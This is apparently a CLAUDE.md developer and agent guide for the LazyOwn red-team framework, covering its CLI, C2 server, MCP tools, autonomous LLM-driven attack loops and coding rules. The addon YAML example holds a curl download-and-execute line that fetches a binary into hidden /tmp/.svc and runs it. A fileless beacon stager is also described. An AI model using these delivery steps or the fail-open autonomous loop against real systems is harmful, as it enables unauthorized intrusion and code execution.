# CLAUDE.md — LazyOwn RedTeam Framework

Durable context for any Claude/agent touching this repo. Source of truth: `lazyown.py`, `lazyc2.py`, `utils.py`, `payload.json`, `skills/`, `modules/`, `templates/`.

> **Role-routed context:** `AGENTS.md` is the entry point for an agent that
> modifies this repository. `CORE.md` is the entry point for an agent that
> consumes LazyOwn as a dependency. This file is the shared contract both
> reference. Load only the file that matches the role to save context.

---

## 0. What LazyOwn is

Professional red-team / pentest framework:
- **CLI** (`lazyown.py`): cmd2 shell, ~4,900 LOC, 890 commands + 130 aliases driven by 67 ``CommandSet`` modules under ``cli/commands/``.
- **C2** (`lazyc2.py`): Flask + Jinja2 + Socket.IO, 121 routes, 55+ templates, malleable HTTP profiles, XOR-stub Go beacon, multi-operator `/collab/`, phishing (SQLite + Groq).
- **Utils** (`utils.py`): ~138 helpers (config, ANSI, NVD/ExploitAlert/PacketStorm scrapers, ARP, certs).
- **Skills** (`skills/`): MCP server (194 tools), autonomous daemon, hive-mind, MoE+RL SWAN, parquet KB, policy engine, Groq/Ollama agents.

## 0.1 Security contracts

Each security control is a single contract in its own file. Full specs in `docs/SECURITY_CONTRACTS.md`.

The contract index, per-file specs, and the hardening sprint history (v1 to
v5, including the CodeQL batch) live in `docs/SECURITY_CONTRACTS.md`.
`scripts/check_contract_manifest.py` fails CI when the index drifts from the
files on disk. Run the hardening suites with:

```sh
pytest tests/test_security_hardening*.py -v
```

`mutmut run` gates the runtime hardening primitives.

## 0.2 Non-negotiable: user input is hostile

**Every byte of user-controlled input MUST be treated as malicious — no exceptions, ever.**

This is not a guideline. It is the single most important security rule in this codebase.

| Rule | What it means |
|------|---------------|
| Never trust user input | Every `request.args`, `request.form`, `request.json`, `request.headers`, `request.cookies`, route parameter, `sys.argv`, `input()`, file upload name, and any other external input is assumed to be a deliberate attack until proven otherwise. |
| Sanitize before use | User input must be sanitized *before* it touches any filesystem path, SQL query, shell command, system call, template render, or serialization. No exceptions, not even for "internal" or "trusted" endpoints. |
| Path traversal is the #1 vector | Any user input that ends up in `os.path.join`, `open()`, or any filesystem operation MUST go through a whitelist character filter AND an `os.path.realpath` prefix check against an explicit allowed directory. Even a single character of uncontrolled path input is unacceptable. |
| Defense in depth | A sanitization function is not enough. Always add a second layer: `os.path.realpath()` + `.startswith(allowed_dir + os.sep)` before any file I/O. If the path does not resolve within the allowed directory, reject with 403. |
| Log and reject | When user input fails validation, log the rejection event and return a generic error. Never reflect the rejected input back to the user (information leak). |
| CodeQL path-expression alerts are blockers | Any CodeQL "Uncontrolled data used in path expression" alert is a critical security bug and must be fixed before merge. No exceptions, no suppressions. |

### Implementation pattern

The canonical `safe_path(user_input, allowed_dir, prefix="")` helper
(whitelist character filter + `os.path.realpath` prefix check) MUST be used
whenever user input contributes to a filesystem path. Copy it verbatim from
[`docs/SECURITY_CONTRACTS.md`](docs/SECURITY_CONTRACTS.md); do not "improve"
it without peer review.

### C2 Transport & Evasion contracts

Each module is a single-file contract for one transport or evasion concern.
The module and test table lives in `docs/SECURITY_CONTRACTS.md`. Compat:
PROD fail-fast on missing C2 keys, DEV warn-and-default. AES key is
`payload.json:aes_key` (64 hex) to `self.aes_key` (bytes) plus
`self.params['aes_key']` (hex). Lazyaddons use `{{aes_key}}` or `{aes_key}`.

---

## 1. Entry points

```sh
./run [--no-banner] [-s] [-p sessions/foo.json] [-c 'cmd']   # cmd2 shell
bash fast_run_as_r00t.sh --no-attach --vpn 1                 # full stack in tmux 'lazyown_sessions'
bash scripts/setup_hermes_mcp.sh                           # register MCP, resolves the repo path at runtime
bash skills/mcp_restart.sh                                   # after editing MCP code
```

- `./run` activates `env/` venv then runs `python3 -W ignore lazyown.py`.
- **Only** `lazyown.py` is launched directly; other Python files are imported / executed via `do_run` / called from MCP / spawned by daemon.
- `fast_run_as_r00t.sh` runs as root: starts C2 on `lhost:c2_port` w/ self-signed TLS, nmap recon, auto-loop. `sleep_start` (default `333`s, see `payload.json`) **must** elapse before first loop fire — never timeout below it.

---

## 2. Repo map

| Path | Role |
|------|------|
| `lazyown.py` | cmd2 shell `LazyOwnShell(cmd2.Cmd)`; CLI skeleton + startup hooks. Commands in ``cli/commands/``. |
| `lazyc2.py` | Flask + Socket.IO C2, decoy site, phishing bp, dashboard, /pty xterm. |
| `utils.py` | Shared helpers + `Config`, `VulnerabilityScanner`, `MyServer`, `IP2ASN`. |
| `payload.json` | **Only** runtime config. Read by every component. |
| `templates/` | 55+ Jinja2; extend `base.html`. Subdirs: `phishing/`, `landing_pages/`, `emails/`. |
| `static/` | CSS/JS (xterm.js, particles.js), icons, `body_report.json`. |
| `modules/` | 65+ modules: LLM clients, `collab_bp`, `dashboard_bp`, world model, playbook engine, `metasploitable_migrations` (gym setup). |
| `modules/integrations/` | MISP export, Nuclei, Searchsploit. |
| `modules/backdoor/` `modules/rootkit/` `modules/win_rootkit/` | C/C++/C# implants & rootkits. |
| `skills/` | MCP server + autonomous daemon + hive_mind + swan + policy + parquet_db. |
| `sessions/` | Campaign state — **gitignored**, never delete w/o confirmation. `git add -f` to stage. |
| `parquets/` | Columnar KBs: GTFOBins, LOLBas, MITRE ATT&CK (6 `.parquet`). |
| `plugins/` | Lua plugins (lupa). Each `.lua` + `.yaml` metadata. |
| `lazyaddons/` | 124 YAML tool integrations. Auto-discovered. |
| `tools/` | 69 pwntomate `.tool` files; auto-trigger on nmap services. |
| `external/` `modules_ext/` `vpn/` | **Gitignored**; `git add -f` required. Never commit creds. |
| `lazyscripts/` `playbooks/` `gyms/` `lazyadversaries/` | `.ls` recipes, YAML APT playbooks (7 actors), YAML gym catalogue, threat profiles. |
| `cli/` | Shell extensions: wizard, graph advisor, reactive hints, dashboard TUI, palette. Zero imports from `lazyown.py`. |
| `cli/commands/` | cmd2 `CommandSet` subpkg, auto-discovered by `cli/registry.py`. `infra.py` owns disposable C2. |
| `deploy/` | Ephemeral IaC: `redirector/` (cloudflared + Caddy path filter), `c2/` (local stack, Caddy auto-TLS), `infra/providers/digitalocean/` (droplets + firewall), `range/ad-mini/` (isolated AD lab). |
| `core/` | Canonical `Config`, crypto, validators, `typing.Protocol` interfaces. `core/param_registry.py` owns the shared parameter catalog (`params/operator.yaml`). No framework imports. |
| `scripts/` | Build/maintenance: `build_command_index.py`, `patch_playbook_atomic_ids.py`. |
| `tests/` | 516 files, ~7400 tests. No mocking of C2 or daemon. Gates: `docs/quality_gates.md` + `tests/run_mutation_*.py`. |
| `lazyown-docker/` `lazygui/` | Docker + desktop GUI. |
| `docs/` | GH Pages site — auto-generated by `DEPLOY.sh`, don't edit HTML. |
| `lazyc2/` | Security validators (`validate_route_path`, `validate_template_name`, `is_safe_template_path`). |
| `banners/` `source/` | Banner / artwork. |
| `QUICKSTART.md` | Canonical 5-min onboarding. Manual; update when operator flow changes. |

**Every directory has a `README.md`.** Create one when adding a dir (§10 rules: English-only, no emojis, file/subdir table, "How it works" + "Adding X", no generated content).

---

## 3. `payload.json` — single config source

Loaded by `core.config.load_payload()`, wrapped by `class Config` (`core/config.py`). Every component reads here. **Nothing hardcoded; nothing duplicated; if reused → goes here.**

Typed shape lives in `core/payload_schema.py` (`SCHEMA`): each well-known key has a `FieldSpec` (kind, default, description, example, sensitive/required). Use `validate_payload`/`validate_value`/`coerce_value`. New keys are picked up by the wizard, `assign` and the readiness report automatically.

Critical keys:

| Key | Purpose |
|-----|---------|
| `rhost`, `lhost`, `rport`, `lport` | Target/attacker IPs+ports |
| `c2_port`, `c2_user`, `c2_pass` | C2 socket + basic auth |
| `domain`, `subdomain`, `os_id` | Target context (os_id 1=lin/2=win) |
| `start_user`, `start_pass` | Initial creds (auto-injected on discovery) |
| `wordlist`, `usrwordlist`, `dirwordlist`, `dnswordlist`, `iiswordlist` | SecLists paths |
| `c2_malleable_route` | Beacon URI prefix (default `/pleasesubscribe/v1/users/`) |
| `user_agent_*`, `url_traffic_*` | Malleable C2 profile |
| `sleep`, `sleep_start` | Beacon jitter + auto-loop bootstrap delay |
| `api_key` | Groq (used by `report.py`, AI agents) |
| `enable_telegram_c2`/`discord_c2`/`ia`/`deepseek`/`cloudflare`/`run_in_memory`/`c2_implant_debug`/`c2_debug` | Feature flags |
| `llm_backend` | LLM selection: `"auto"` (Groq when API key set, else Ollama), `"groq"`, `"ollama"` |
| `llm_model_groq` / `llm_model_ollama` | Model IDs (defaults `llama-3.3-70b-versatile` / `deepseek-r1:1.5b`) |
| `ollama_host` | Ollama base URL (default `http://localhost:11434`) |
| `llm_daily_budget_usd` / `llm_per_call_token_cap` / `llm_budget_enabled` / `llm_reset_at_utc` / `llm_model_prices` | Budget proxy caps and ledger (`1.0` / `8000` / `true` / `00:00` / USD-per-MTok table) |
| `c2_daily_limit`, `c2_hour_limit`, `c2_login_limit` | flask-limiter strings |
| `c2_tls_verify` | CLI→C2 HTTPS verification: `auto` (pin local `cert.pem`, default), `true` (system CA), `false` (disabled), or a CA-bundle path |
| `c2_metrics_token` | Bearer token for remote `/metrics` scraping (empty = loopback-only) |
| `targets` | Multi-target list (status, ports, tags, notes) |
| `scope` | Authorized engagement scope: list of CIDR/IP/hostname entries (`*.` wildcards). Empty = scope guard dormant |
| `scope_enforcement` | Scope guard posture: `off` (disabled), `warn` (annotate, default), `enforce` (block out-of-scope offensive commands) |
| `rat_key` | XOR key for stub/beacon |
| `device`, `startip`, `endip` | Net discovery range |

**Read/write:** CLI in-process `self.params[key]` (saved via `do_assign`/`do_set`); external `Config(load_payload())`; MCP `lazyown_get_config`/`lazyown_set_config`. Cross-process state goes through `payload.json` — don't invent JSON files unless a genuinely different domain (`sessions/world_model.json`, `tasks.json`, `objectives.jsonl`).

---

## 4. Architecture

```
operator/Claude ──► ./run ─► lazyown.py (cmd2)
                ──► MCP   ─► skills/lazyown_mcp.py (~131 fns) ─► skills/{daemon,hive_mind,swan,policy,parquet_db}
                ──► Web   ─► lazyc2.py (Flask+SocketIO+Jinja2, /pty, DNS)
                                        │
                       all ──► utils.py (Config, run_command, …) ──► payload.json
                                        │
                                  sessions/ · parquets/ · templates/ · modules/ · plugins/ · lazyaddons/ · tools/
```

CLI and C2 both import `utils.py` + read `payload.json`. MCP reuses `LazyOwnShell` — no second CLI implementation.

---

## 5. CLI conventions (`cli/commands/` CommandSets)

- New commands live in a `cli/commands/<module>.py` `CommandSet` subclass of `cli.commands._base.LazyOwnCommandSet`, auto-discovered and registered by `cli/registry.py` at boot. Migration is done (~880 `do_*` under `cli/commands/`); `lazyown.py` keeps only the `LazyOwnShell` skeleton.
- **Do not add new `do_*` to `lazyown.py`** — it re-grows the god class. Only edit it for shell-skeleton concerns.
- Methods `do_<name>(self, line)` on the `CommandSet`; docstring = `help <name>`.
- Args: `@with_argparser(parser)` for non-trivial; `@with_argument_list` for simple split.
- `@with_category('Recon')` etc. — keep existing names.
- Aliases: `aliases` dict at class level; payload-derived aliases use class-body `f""` (refresh on shell restart).
- `self.params` mirrors `payload.json` and is forwarded to the bound shell
  by `LazyOwnCommandSet`. Write back via `do_assign`/`do_set` only.

### Adding a command — happy path
Place the `do_*` in the phase-matching `CommandSet` under `cli/commands/`
(new module + set + `README.md` only when none fits); read inputs from
`self.params` (never positional when in payload); validate with
`check_rhost`/`check_lhost`/`check_lport`; execute via `run_command(cmd_str)`
(captures output, strips ANSI, CSV-logs); write artefacts to `sessions/...`
with stable names; add at most **one** short alias. MCP exposes every `do_*`
via `lazyown_run_command` automatically; if the command has a phase, add it to
the bridge catalog (`modules/c2_profile.py`) so auto-loop sees it.

### Sad paths
- Missing payload key → `check_rhost(...)` False → `print_error` + `return` (don't raise).
- External binary missing → guard with `is_binary_present(name)`, `print_warn` with install hint, no silent fallback.
- Long-running tool → never timeout below documented runtime (e.g. `lazynmap` ≥ 30 min); detach via `subprocess.Popen`.
- OS mismatch → read `sessions/os.json`/`payload.json["os_id"]`; refuse Linux-only against Windows.
- Sensitive output → never print secrets; write to `sessions/credentials*.txt` / `hash*.txt`.

### Do NOT
- Import `lazyc2` from CLI — CLI must run without Flask.
- Write to `payload.json` outside `do_assign` / `do_set` / `lazyown_set_config` / `auto_populate` / `do_scope` (race condition).
- Hardcode wordlist/port/IP — use `self.params`.
- Introduce new `print_*` style — use `print_msg`/`print_warn`/`print_error`.

### Scope guard
Every interactive command flows through `LazyOwnShell.onecmd_plus_hooks`, which calls `_scope_check` before dispatch. Offensive commands (kill-chain categories 01–09 + Pwntomate + Adversary, see `cli/scope_guard.OFFENSIVE_CATEGORIES`) targeting an out-of-scope `rhost` are warned (`warn`) or blocked (`enforce`). The guard is **fail-open**: dormant while `scope` is empty or `scope_enforcement` is `off`, and any internal error allows the command. Manage it with the `scope` verb. When you add a `do_*` in an offensive category it is auto-classified — no extra wiring.

---

## 6. C2 (`lazyc2.py`)

- `app = Flask(__name__, static_folder='static')` (~line 1610).
- `socketio = SocketIO(app, async_mode='threading', transports=['websocket'])`; namespaces `/listener`, `/pty`, `/terminal`.
- `flask-limiter` from `c2_daily_limit`/`c2_hour_limit`/`c2_login_limit`.
- 80+ routes: landing/dashboard, malleable beacon protocol (`/command/<id>`, `<route_maleable><id>`), uploads, short-URL beacons, phishing, terminal/PTY, surface graph, Bloodhound zip, AI bots, JSON dashboard at `/api/dashboard`.
- Blueprints: `operations_bp`, `auth_bp`, `addons_bp` (LazyAddon creator, `/addons`), `phishing_bp`, `dashboard_bp` (`/dashboard`), `collab_bp` (`/collab`).
- **Blueprint config pattern**: `lazyc2.py` sets `app.config["LAZYOWN_CONFIG"] = config` before `register_blueprint`. Blueprint reads via `current_app.config.get("LAZYOWN_CONFIG")` — do NOT pass module globals.
- Auth: HTTP Basic via `requires_auth` (uses `c2_user`/`c2_pass`) + `flask-login` for operator UI.
- DNS server: `dnslib` resolver in daemon thread.
- Watcher: `watchdog.Observer` reading `event_config.json`.

### Adding a route — happy/sad paths
Decide operator-only (`@requires_auth`) vs beacon-facing (apply both the
canonical path AND the `f'{route_malleable}<...>'` alias); `render_template`
with typed context, never raw request data; **always** validate with
`validate_route_path` + `validate_template_name` + `is_safe_template_path`
(canonical tuple-returning implementations in `lazyc2/security/validators.py`;
new code consumes the tuple form) before any file I/O — reject paths escaping
`templates/`. Persist via `load_routes`/`save_routes` (atomic `*.tmp` →
`os.rename`) or `sqlite3` inside `with`. New Jinja2 extends `base.html`;
filenames match `^[a-zA-Z0-9_-]+\.html$`; mark `|safe` only for HTML you
produced. Beacon routes accept POST without CSRF (implants carry no token) but
operator mutations require auth + session cookie. Non-`127.0.0.1`/`lhost` IPs
fall through to `decoy()` (`decoy.html`) — never break it; operator routes
check auth AND origin. Bind to `lport`/`c2_port`; TLS from `gen_cert.sh`, HTTPS
in PROD. Phishing routes register on `phishing_bp`, not `app`.

---

## 7. `utils.py`

Only module both CLI and C2 import. Use existing helpers:

| Need | Use |
|------|-----|
| Read `payload.json` | `load_payload()` → `Config(...)` |
| ANSI output | `print_msg`/`print_warn`/`print_error` |
| Shell + capture | `run_command(cmd)` |
| XOR | `xor_encrypt_decrypt(data, key)` |
| Self-signed TLS | `generate_certificates()` |
| Exploit search | `find_ss`/`find_ea`/`find_ps`/`nvddb`/`exploitalert`/`packetstormsecurity` |
| HTTP req | `generate_http_req(host, port, uri, ...)` |
| Input validation | `check_rhost`/`check_lhost`/`check_lport` |
| Binary present? | `is_binary_present(name)` — `shutil.which` based, no shell |
| Optional heavy dep | `from core.dependencies import optional_import, optional_attr` — bind lazily so a missing package degrades one feature, not the whole framework |
| Tmux bootstrap | `ensure_tmux_session(name)` |
| Emails/users/creds | `generate_emails`/`get_users_dic`/`crack_password` |
| Vulnerability scan + persist | `VulnerabilityScanner().search_cves(service)` → `.persist(service, target, cves)` writes `sessions/vulns_<target>.json` |
| LLM backend | `from modules.llm_factory import get_llm_backend, try_get_llm_backend` — reads `llm_backend`/`llm_model_*`/`ollama_host` from `payload.json` and returns an `AIModel` that also structurally satisfies `core.protocols.LLMBackend` |

New helpers go here only if shared CLI↔C2. Feature-local helpers → `modules/<feature>.py`.

**LLM backends**: never instantiate `GroqModel`/`OllamaModel` directly — use `modules.llm_factory.get_llm_backend` (raises) or `try_get_llm_backend` (`None` on failure), which reads `llm_backend`/`llm_model_*`/`ollama_host` from `payload.json` so swapping providers needs no code change. Callers passing an explicit `provider` translate legacy `groq`/`deepseek` via the local `_PROVIDER_ALIAS` map.

---

## 8. MCP — `skills/lazyown_mcp.py`

~194 tools. **Never re-implements** CLI/C2 — imports `LazyOwnShell` or composes shell + REST + file reads.

### Adding a tool — happy/sad paths
Functionality must exist as `do_*` / utils helper / C2 endpoint first; name
`lazyown_<verb>_<noun>`; document params via JSONSchema (required/optional
explicit); return structured JSON, not prose; run `bash skills/mcp_restart.sh`
after editing. MCP discovers addons/plugins/`.tool` files at startup — prefix
unambiguously to avoid collisions. Long-running → detach + return, add a
`*_status` poll tool. Never cache `payload.json` across calls (operator may
change it via CLI).

---

## 9. `sessions/` — authoritative campaign state

**Only** durable cross-process location. Never delete without operator confirmation.

| File | Producer | Consumer |
|------|----------|----------|
| `scan_<rhost>.nmap[.xml]` | `do_lazynmap` | autonomous_daemon, pwntomate, FactStore |
| `vulns_<rhost>.nmap` | `do_lazynmap` (vuln scripts) | reactive_engine |
| `<ip>/<port>/<tool>/*.txt` | pwntomate | bridge_suggest, threat_model |
| `logs/command_<tool>output<domain>.txt` | run_command CSV logger | facts_show |
| `LazyOwn_session_report.csv` | every command | timeline_narrator, threat_model |
| `credentials*.txt`, `hash*.txt` | reactive_engine, do_responder | later phases |
| `vulns_<rhost>.json` | `do_vulns` via `utils.VulnerabilityScanner.persist` | `get_target_context`, reactive_engine, report generator |
| `world_model.json` | autonomous_daemon | session_state, recommend_next |
| `tasks.json` | campaign_tasks | sitrep, dashboard |
| `objectives.jsonl` | inject_objective | autonomous_daemon |
| `sessionLazyOwn.json` | shutdown/handoff | sitrep, c2_notes |
| `os.json` | do_ping, beacon ground truth | every selector |
| `events.jsonl`, `autonomous_events.jsonl` | event_engine, daemon | poll_events |
| `campaign_lessons.jsonl` | EpisodeReflectionEngine | next campaign |
| `policy_facts.json` | policy engine | dashboard |
| `captured_images/` | decoy site | operator review |
| `keyword_fallback_index.json` | keyword RAG index (vector store removed) | rag_query |
| `blacksandbeacon` | `blacksandbeacon` addon (`make`) | collab_join delivery |

Before any tool: (1) `ls sessions/`, (2) read existing artefacts. If answer exists, don't re-scan.

---

## 10. Coding standards (enforced by review)

Full 15-point contract in `docs/coding_standards.md`. Non-negotiables: English only, no comments, no emojis, docstrings on public symbols, no magic numbers, no hardcoded paths/creds, SOLID, boy-scout law, DRY, tests trend to 100%, docs follow code.


---

## 11. Spec-driven discipline (in commit/PR body, not code)

**Happy path**: trigger? inputs (payload keys/CLI args/MCP params)? success outcome (`sessions/` file / event / return value)? operator-visible signal?

**Sad paths** (≥ 6 considered per change): required payload key missing/empty; external binary or wordlist absent; network unreachable/timeout/TLS error; target OS mismatch; output already in `sessions/` (don't redo destructive work); concurrent writer (CLI + daemon); AV/EDR detected → `escalate_evasion`; SIGINT → `signal_handler` cleans tmux/sockets; long-running tool exceeds runtime (log + continue, never auto-kill); phishing name fails validation → re-render with flash error, never `500`.

If a sad path has no defensive code, justify explicitly (e.g. "trusted internal call from `do_assign`, validated upstream").

---

## 12. Agent prompt/context engineering

When invoking Claude/Groq/Ollama (`lazyown_llm_ask`, `swan_run`, `hive_spawn`, `groq_agent`):

- **System prompt** — persona from `sessions/soul.md` (canonical, the only persistent persona/policy file; update via `lazyown_soul`). Include hard stops (PII, customer-of-customer, destructive ops).
- **Context window** — only what changes the next decision: current phase (`world_model.json`), last 3 commands+outputs (`LazyOwn_session_report.csv`), top-3 pivot candidates (`NetworkGraph.centrality()`), active objective (`objectives.jsonl`), relevant captured creds.
- **Tool catalogue** — filter the bridge catalog to current phase + OS, never all commands.
- **Output contract** — request `{"command","reasoning","mitre"}`; reject prose.
- **Reward shaping** — Detection Oracle + OutcomeEvaluator score each step → RL Q-table + MoE weights; new selectors emit reward `∈ [0, 1]`.

---

## 13. Pick the right extension surface

| Goal | Surface |
|------|---------|
| Wrap existing GitHub tool | `lazyaddons/<name>.yaml` |
| One-liner / payload generator | `plugins/<name>.lua` |
| Auto-run on discovered service | `tools/<name>.tool` |
| New CLI command | `do_<name>` in a `CommandSet` under `cli/commands/` (never `lazyown.py`) |
| New web UI page / beacon endpoint | `lazyc2.py` route + Jinja2 |
| New Flask blueprint | `modules/<name>_bp.py` + register in `lazyc2.py`; config via `app.config["LAZYOWN_CONFIG"]` |
| New MCP tool | `skills/lazyown_mcp.py` |
| New autonomous selector | subclass `BaseSelector` in `skills/autonomous_daemon.py` |
| New AI agent persona | `skills/lazyown_groq_agents.py` registry |
| New LLM backend | implement `AIModel` in `modules/ai_model.py`, register identifier in `modules/llm_factory.SUPPORTED_BACKENDS`, expose via the `_PROVIDER_ALIAS` mapping when callers need the legacy `groq`/`deepseek` identifiers |
| New knowledge base | new parquet + `lazyown_parquet_query` mode |
| New directory | create + `README.md` immediately |

Adding `do_*` for something that works as a YAML addon = smell.

**Blueprint `template_folder` pattern**: `Blueprint("name", __name__, template_folder="../templates")` resolves `render_template("foo.html")` against root `templates/`. Don't duplicate into `modules/templates/`.

---

## 14. Things this framework deliberately does NOT do

- Detection evasion as primary feature (only in authorized engagements).
- Persist secrets in git (`cert.pem`, `key.pem`, `api_key`, `sessions/credentials*`).
- Run on Windows as host (`lazyown.py` exits if `os.name == 'nt'`). Linux/macOS operator targeting Linux/Win victims.
- Mock C2 or daemon in tests — integration tests run against `sessions/` fixtures.

---

## 15. Quick MCP cheatsheet

```
lazyown_session_init() / lazyown_campaign_sitrep()
lazyown_set_config(key="rhost", value="10.10.11.5")
lazyown_phase_guide(phase="recon") / lazyown_run_command("lazynmap")
lazyown_auto_populate(target="10.10.11.5") / lazyown_facts_show(target="...", refresh=True)
lazyown_searchsploit(query="<service> <version>")
lazyown_parquet_query(mode="context", phase="enum", target="...") / lazyown_rag_query(query="…", n=5)
lazyown_auto_loop(target="...", max_steps=10) / lazyown_autonomous_start(max_steps_per_objective=15)
lazyown_swan_ensemble(...) / lazyown_hive_spawn(goal="…", n_drones=4, roles=[...])
lazyown_generate_report(target="...", include_timeline=True)
lazyown_report_update(action="auto_fill")
lazyown_misp_export()
# CLI: collab_join <handle> [--curl]
# CLI: explore [target]                   — coverage tree + trigger-matched addons/tools
```

---

## 15a. Graph-aware navigation

Self-knowledge graph at `graphify-out/graph_lazyown.json`, built by `/graphify`, consumed by `cli/graph_advisor.py`. Live counts via `lazyown_graph_summary` (MCP) or `graph_search`/`god_nodes` (CLI). Advisory: if `summary()['health']` is `stale`/`empty`, run `/graphify . --update` first.

**CLI**: `graph_search <q> [n]`, `neighbors <node> [depth] [n]`, `god_nodes [N]`, `suggest_next [seeds...] [N]` (no seeds → reads `sessions/LazyOwn_session_report.csv`). Shell `default()` uses advisor for "did you mean…?".

**MCP**: `lazyown_graph_summary`, `lazyown_graph_search`, `lazyown_graph_neighbors`, `lazyown_graph_suggest_next`. All accept `budget_tokens` (default 1500). Missing graph → `{"available": false, "reason": "..."}`.

**Refresh**: `/graphify .` (full) or `/graphify . --update` (incremental). Advisor caches by `(path, mtime)` — picked up on next call, no restart needed.

---

## 15b. Operator UX

Inline reactive hints (`cli/reactive_hints.py`) and the Textual dashboard (`cli/dashboard_tui.py`) are documented in `cli/README.md`. Hints print one dim line per command, skip `SKIP_COMMANDS` verbs, honour `enable_inline_hints`, and degrade to a no-op without a graph. Dashboard entry: `launch(payload_path, sessions_dir)`.

### Usability contracts

Full contracts in `cli/README.md` (coaching levels `ui_hints`, `cli/phase_labels.py`, `scripts/sync_doc_stats.py` doc counts). Mutation gate: `tests/run_mutation_ux_usability.py`.

### Addon YAML pattern
```yaml
os: linux                  # MITRE platform (any|linux|windows|macos|network|...)
trigger: [microsoft-ds]    # nmap service names that auto-suggest this addon; [] = manual
tool:
  install_command: make
  execute_command: git restore . ; git pull ; make && cp <binary> ../../../sessions/<binary>
  lazycommand: curl -sk "http://{lhost}:{lport}/<binary>" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
```
Rules: always `git restore . ; git pull` before `make`; stage to `sessions/<binary>`; use `{lhost}`/`{lport}` placeholders; never hardcode. Fill `os`/`trigger` so `explore`/`recommend_next` surface the addon. Tests: `tests/test_blacksandbeacon_addon.py` + `tests/test_bsb_fileless_compat.py`.

Fileless delivery (blacksandbeacon): the lazycommand stages a base64 python
stager that pulls ELF + config from `/s/blacksandbeacon[_config]`,
memfd_creates and execve's the beacon from anonymous memory;
`modules/bof_delivery.deploy_client` runs the same stager. Wire routes add
`/api/poll/<id>` and `/report/` to the `/command/` contract.

---

## 15d. Multi-operator collaboration — `collab_bp`

`modules/collab_bp.py`: `EventBus` (SSE, replay 20), `LockManager` (per-target TTL locks), `OperatorRegistry` (90s heartbeat), `ColabEvent`. Endpoints: `/collab/`, `/collab/stream`, `/operators`, `/publish`, `/lock`, `/unlock`, `/history`. Tests: `tests/test_collab_and_onboarding.py`.

## 15e. Onboarding — `QUICKSTART.md` + `wizard`

`QUICKSTART.md` is canonical onboarding (update when flow changes). `cli/wizard.py` never imports `lazyown.py`/`lazyc2.py`; takes `params` + `save`, auto-detects `lhost`. Run `wizard` / `wizard --check`; auto-launches on first run when `rhost` unset.

## 15f. Release — `DEPLOY.sh`

Rebuilds `README.md` + `docs/index.html`, bumps `version.json`, signed tag + GH release. Non-interactive: `printf "1\nfeat\nsubject\nbody\n" | bash DEPLOY.sh --no-test`.

## 15g. Branching strategy (law)

Three-branch model: `dev` (active), `pp` (staging/QA), `main` (release). Flow: `feature/*` → `dev` → `pp` → `main`. Hotfix: branch from `main`, PR to `main`, back-merge to `pp` and `dev`. Agents work on `dev`.

Mandatory sync before touching `dev` (`main` moves fast; stale `dev`
silently drops commits). With a clean tree (stash if dirty):

```sh
git fetch origin main dev && git checkout dev
git merge --ff-only origin/main || git merge --no-edit origin/main
```

`git merge-base --is-ancestor origin/main HEAD` must pass and
`git rev-list --count HEAD..origin/main` must print 0. Otherwise STOP.

## 15h. claude_md_orchestrator skill

`skills/claude_md_orchestrator/` implements the SDD+TDD+BDD+Boy Scout
cycle, resuming from `state.json` after every stage. Invocation and stage
detail: `skills/claude_md_orchestrator/README.md`. CI hardening is pinned
by `tests/test_ci_strict.py`.

---

## 15i. LLM budget cap

`core/llm_budget.py` — daily cost cap + per-call token cap via proxy wrapping. Budget config keys: `llm_daily_budget_usd` (default 1.0), `llm_per_call_token_cap` (8000), `llm_budget_enabled` (true), `llm_reset_at_utc` (00:00), `llm_model_prices` (per-model USD/1M tokens). Persists spend to `sessions/llm_budget.json`. CLI: `llm_budget` / `llm_budget json` / `llm_budget reset`. MCP: `lazyown_get_llm_budget`. Tests: `tests/test_llm_budget.py`.

## 15j. LazyGUI — v2.0 Operator Console (PySide6 Desktop App)

Architecture, backend communication contracts, and domain models:
`lazygui/README.md`. Core panels: Topology, Sessions, Listeners, KillChain,
Collaboration. Backend over the authenticated HTTP API (`/api/*`).

## 15k. LazyAddon Creator contract (C2 guided form)

Guided `/addons` pages author `lazyaddons/*.yaml` without hand-editing
YAML: one form covers every addon option with tooltips, placeholders,
per-field help, and drag-and-drop placeholder chips. Full spec,
security invariants, and routes: `lazyc2/README.md`.

| File | Role |
|------|------|
| `lazyc2/addon_creator.py` | Single-file contract (config, draft, validator, renderer, store, parser) |
| `lazyc2/blueprints/addons.py` | `/addons` list, create, view, delete blueprint; CSRF on every mutation |
| `templates/addon_creator.html` + `addons.html` + `addon_view.html` | Form, list, and YAML preview |
| `tests/test_addon_creator.py` | 71 TDD+BDD tests |
| `tests/run_mutation_addon_creator.py` | Mutation gate: 10 mutants, all killed |

DoD gate: `pytest tests/test_addon_creator.py` green, mutation runner
reports `10 killed, 0 survived`. Wired in the `lazyc2.py` blueprint try
block; nav entry next to Tools in `templates/base.html`.

---

## 15k.1 Campaign Explorer — navigable index over `sessions/` (v1)

Turns the dead session artefact tree into a navigable Campaign → Host →
Evidence surface with an opinionated next-scope ranking. Read-only: no
route ever writes; actions stay in the shell behind the scope guard.

| File | Role |
|------|------|
| `modules/session_index.py` | `SessionIndex`: classify, path-safe resolve, capped read, regex search, `host_cards` (world model + findings + outcomes + beacon history), `scope_frontier`, `overview`. Pure, injected I/O, short mtime cache |
| `lazyc2/blueprints/campaign.py` | `/campaign` page + `/api/campaign/overview|host/<ip>|file|search`; operator session on every route; viewer answers `text/plain` + `nosniff`; traversal answers 403 |
| `templates/campaign.html` | Three-pane operator view (hosts / detail+viewer+grep / frontier), all rendering via `textContent`, zero `innerHTML` |
| `tests/test_session_index.py` | Classification, traversal fail-closed (incl. symlink escape), caps, aggregation, frontier scoring, blueprint guards |

Data sources (nothing new is computed twice): world model via
`read_state_dict`, findings store `sessions/findings/*.jsonl`, outcome
bus `sessions/outcomes.jsonl`, beacon history `*.records.jsonl`,
freshness via `DEFAULT_FRESHNESS_THRESHOLD_SECONDS` (7d). Scope
membership is read from `payload.json` `scope` entries and evaluated
with `cli.scope_guard.target_in_scope` — out-of-scope candidates are
marked "requiere aprobación", never auto-added.

---

## 15l. Autonomous loop contracts

Profiles, chain v2, outcome bus, emulation runner, addon updates and the MS2 gym: `docs/autonomous-loop.md`, `docs/outcome-bus.md`, `docs/emulation-runner.md`, `docs/metasploitable-gym.md`, `docs/lazyaddons-yaml.md`. Tests: `tests/test_{orchestrator_yaml,chain_runner,outcome_bus,emulation_runner,addon_updater,metasploitable_gym}.py` plus mutation runners.

### 15l.1–15l.4 Honest endings, audit, cleanup, auto_pwn (v6)

A loop that "finishes" against a dead target is the worst failure mode.
The closing contracts (one test file each):

